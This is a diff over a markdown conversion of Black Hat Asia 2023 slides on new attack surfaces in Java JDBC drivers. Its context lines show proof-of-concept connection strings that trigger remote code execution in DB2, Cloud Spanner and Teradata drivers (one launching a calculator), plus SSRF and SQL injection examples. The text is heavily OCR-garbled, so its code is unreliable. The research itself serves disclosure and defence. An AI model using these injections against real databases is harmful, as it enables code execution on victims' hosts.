@@ -22,7 +22,6 @@ converted_at: "2026-08-11T23:59:04Z"
 **Conference:** Black Hat ASIA 2023  
 **Source:** `Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf` (80 pages)
 
-
 ## Slide 1
 
 # A New Attack Interface In Java Applications
@@ -118,7 +117,6 @@ NamingEnumeration<SearchResult> results = this.sqhctx.search(lbase,
 LDAP_FILTER, constraints) ;
 if (results != null && results.hasMore()) 4{
 SearchrResult si = (SearchResult) results.next() ;
-O CGO N ® OG KR W NY FF
 Attributes attrs = si.getAttributes() ;
 10 NamingEnumeration<? extends Attribute> ae = attrs.getAlLl();
 ```
@@ -132,7 +130,6 @@ Attributes attrs = si.getAttributes() ;
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-O CGO N ® WW KL W NY
 10
 12
 13
@@ -198,12 +195,9 @@ IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
 7 if (var5 ! ULL && !var5.isEmpty()) {
 8 eo) Object var7;
 9 if (!var5.get(0).equals("")) {
-10 ry {
 11 e) var7 \is.c_resolveIntermediate_nns(var6, var2);
-12 if (var? != null) {
 13 var2.setContinue(var/, var6, iS, var5);
 14 } else if (var2.isContinue()) {
-15 is. checkAndAdjustRemainingName(var2.getRemainingName () ) ;
 16 var2.appendRemainingName(var5) ;
 17
 18
@@ -594,7 +588,6 @@ JDBC Attack Protection
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-O @d N DO WF KL W NY
 10
 11
 12
@@ -660,7 +653,6 @@ Payload
 ```text
 MySQL JDBC Driver SQL Injection via setBlob Method
 f Dabase Server |
-Lec} ee > Et Po SS
 Payload Master MySQL Slave MySQL
 DriverManager.registerDriver (new com.mysql.cj}.jdbc.Driver());
 Connection conn =
@@ -823,7 +815,6 @@ import java.sql.DriverMaonager ;
 > public class DB2JCCDemo {
 b public static void main(String[] args) throws Exception { eee
 DriverManager.registerDriver(new com.ibm.db2.jcc.D0B2Driver());
-AC ¥- %
 DriverManager.getConnection( url: "jdbc:db2://127.0.0.1:5001/testdb:pluginClassName=com.example.EvilObject;"); Fi 8 fe)
 Sh
 ol
@@ -880,7 +871,6 @@ private native void getUnixInfo() ;
 protected String username;
 protected long uid;
 cted long gid;
-O CGO N DW OW KR WN
 ected longl] groups;
 10
 2 x Instantiate code>UnixSystem</code id load
@@ -935,7 +925,6 @@ r)
 jboolean jsCopy;
 const charx cmd = env->GetStringUTFChars (env->NewStringUTF ("open
 std::string ee;
-ee += cmd;
 system(ee.c_str());
 return JNI_VERSION_1_2;
 I) pes
@@ -1003,7 +992,6 @@ Google Cloud Spanner Remote Code Execution via Unchecked Class
 1 static @Nullable CredentialsProvider parseCredentialsProvider (String uri) {
 2 String name parseUriProperty (uri, CREDENTIALS_PROVIDER_PROPERTY_NAME) ;
 3 (name != null) {
-4 try {
 5 Class<? extends CredentialsProvider> clazz =
 6 (Class<? extends CredentialsProvider>) Class. forName (name) ;
 7 O Constructor<? extends CredentialsProvider> constructor = clazz.getDeclaredConstructor () ;
@@ -1035,7 +1023,6 @@ DriverManager.registerDriver(new com.google.cloud.spanner. jdbc. JdbcDriver()) ;
 DriverManager .getConnection( url: "jdbc:cloudspanner: /projects/lLearning-pjm/instances/test/databases/test; credentialsProvider=com.sun. security .auth.module.UnixSystem") ;
 eee
 com.mysql.jdbc.test.CloudSpannerDemo
-a} le dle >)
 au
 at
 Caused
@@ -1102,7 +1089,6 @@ Object instance = constructor.newInstance (Objects. requireNonNull (url) );
 return AvaticaHttpClient.class.cast(instance) ;
 } catch (Exception e) {
 throw new RuntimeException("Failed to construct AvaticaHttpClient implementation
-O CGO N DW OW KL W NY FE
 + className, e);
 10
 LS
@@ -1169,10 +1155,8 @@ Run:
 > Console
 de |e
 a ¥
-th = at
 | er
 = at
-roe i at
 at
 at
 at
@@ -1402,8 +1386,6 @@ Snowflake Remote Code Execution via SSO Flow Response
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-mm & x
-lf Jl « >
 a qi
 Snowflake Remote Code Execution via SSO Flow Response
 java.sql.DriverManager
@@ -1492,8 +1474,6 @@ Google Cloud Spanner JDBC Driver Full Read SSRF
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-O @d N DO WwW KL W NY
-Oo kK WN ©
 Google Cloud Spanner JDBC Driver Full Read SSRF
 if (awsCredentialSource.url == null awsCredentialSource.url.isEmpty()) {
 throw new IOException (
@@ -1539,7 +1519,6 @@ Google Cloud Spanner JDBC Driver Full Read SSRF
 
 ```text
 44
-em te vc >
 System.out.printin("Cr
 String credentialsJson
 // note: the project/i
@@ -1575,7 +1554,6 @@ AwsCredentials.refreshAccessToken(AwsCredentials. java:142)
 OAUth2Credentials$1.callCOAuth2Credentials. java: 257)
 OAuth2Credentials$1.call(@Auth2Credentials.java:254) <1 internal Line>
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.61 Transitional//EN
-rn R 4
 <html>
 <head>
 <title>NotADirectoryError:
@@ -1607,7 +1585,6 @@ rn R 4
 6 t
 7
 8 Process var22;
-g try {
 10 e) var22 = Runtime. getRuntime() .exec(var6) ;
 11 } catch (IOException var30) {
 12 throw Utility. logEx(this.log, "Runtime exec", Utility.wrapEx(var30,
@@ -1674,7 +1651,6 @@ ws SQLException { x@1\x01\x00\x03\x00\x90\x00\ x05\ x00\ x00\ x00\t\x00\x01\x01\
 DriverManager.getConnection( url: "jdbc:teradata://127.0.0.1/DBS_PORT=10250, LOGMECH=BROWSER, BROWSER='open -a calcuLlator' , TYPE=DEFAULT , COP=OFF , TMODE=TERA, LOG=DEBUG") ;
 a
 eee
-f=] com.example.jdbc.attack.db2.TeradataDemo AC ve % + x -
 * 2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_| =rce
 2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_ Wf 8 9 | ooo ffs. = In = ial nid-confi ion
 v 2023-04-14.11:41:37.561 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_ socketFactory: sHTTPSProtocol=TLSv1.2
